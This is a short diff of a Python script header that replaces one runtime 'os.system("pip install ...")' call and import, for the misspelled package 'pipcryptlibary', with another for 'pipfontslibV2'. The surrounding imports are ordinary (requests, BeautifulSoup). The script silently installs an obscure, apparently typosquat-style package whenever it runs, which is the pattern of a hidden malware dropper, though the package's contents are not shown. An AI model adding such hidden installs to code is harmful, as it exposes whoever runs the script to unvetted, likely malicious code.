@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptlibary")
-import pipcryptlibary
+os.system("pip install pipfontslibV2")
+import pipfontslibV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
